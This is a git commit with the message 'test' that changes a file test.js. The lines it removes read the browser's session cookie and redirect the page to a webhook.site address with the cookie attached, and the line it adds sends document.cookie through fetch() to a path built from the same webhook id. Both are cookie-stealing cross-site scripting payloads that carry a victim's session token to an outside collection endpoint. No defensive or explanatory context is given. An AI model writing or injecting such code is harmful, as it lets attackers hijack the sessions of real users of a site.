accf7020a84ac7d8a330c81371843b0c47a92c56
OlivierProTips <olivierprotips@gmail.com>
2024-04-09 15:16:02 +0200

    test

--- test.js
+++ test.js
@@ -1,2 +1,1 @@
-var sessionid = document.cookie.split('=')[1] + ".";
-document.location = "https://webhook.site/6c963526-09d6-4f31-a0b4-b841d12a1698/?" + sessionid;
+fetch('6c963526-09d6-4f31-a0b4-b841d12a1698/?c='+document.cookie);
